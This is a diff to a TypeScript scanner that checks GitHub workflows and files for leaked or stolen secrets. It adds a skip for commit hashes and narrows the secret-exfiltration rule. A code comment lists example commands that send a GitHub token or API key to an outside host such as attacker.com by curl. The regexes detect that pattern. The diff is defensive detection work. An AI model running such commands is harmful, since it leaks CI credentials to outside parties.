@@ -295,6 +295,7 @@ const FILE_RULES: ScanRule[] = [
       while ((match = stringRegex.exec(content)) !== null) {
         const value = match[2];
         if (/^https?:\/\//i.test(value) || /^[0-9]+$/.test(value)) continue;
+        if (/^[0-9a-f]{40}$/i.test(value)) continue;
         const entropy = calculateEntropy(value);
         if (entropy >= 4.3) {
           return true;
@@ -466,8 +467,28 @@ const WORKFLOW_RULES: ScanRule[] = [
     id: "workflow-exfiltrate-secrets",
     severity: "critical",
     description: "Workflow may be exfiltrating GitHub secrets externally",
-    test: (content) =>
-      /\$\{\{\s*secrets\.\w+\s*\}\}/.test(content) && /curl|wget|http/.test(content),
+    test: (content) => {
+      // Quick bail-out: must have secrets expression AND curl/wget
+      if (!/\$\{\{\s*secrets\.\w+\s*\}\}/.test(content)) return false;
+      if (!/curl|wget/.test(content)) return false;
+
+      // A secret used as the ENTIRE URL is a legitimate CI/CD pattern
+      // (e.g. Vercel/Netlify deploy hooks stored as a secret).
+      // We only flag when a hardcoded URL co-exists with a secret in the same
+      // curl/wget invocation — meaning the secret is being sent AS data/header
+      // to an external endpoint, not used as the endpoint itself.
+      //
+      // True positives (caught):
+      //   curl https://attacker.com --data "${{ secrets.GH_TOKEN }}"
+      //   curl https://hook.io -H "X-Key: ${{ secrets.API_KEY }}"
+      //
+      // False positives (skipped):
+      //   curl -X POST "${{ secrets.VERCEL_DEPLOY_HOOK_STAGING }}"
+      //   wget "${{ secrets.DOWNLOAD_ENDPOINT }}"
+      return /(?:curl|wget)\b[^\n]*https?:\/\/[^\n]*\$\{\{\s*secrets\.\w+\s*\}\}|(?:curl|wget)\b[^\n]*\$\{\{\s*secrets\.\w+\s*\}\}[^\n]*https?:\/\//.test(
+        content,
+      );
+    },
   },
   {
     id: "workflow-pull-request-target-checkout",
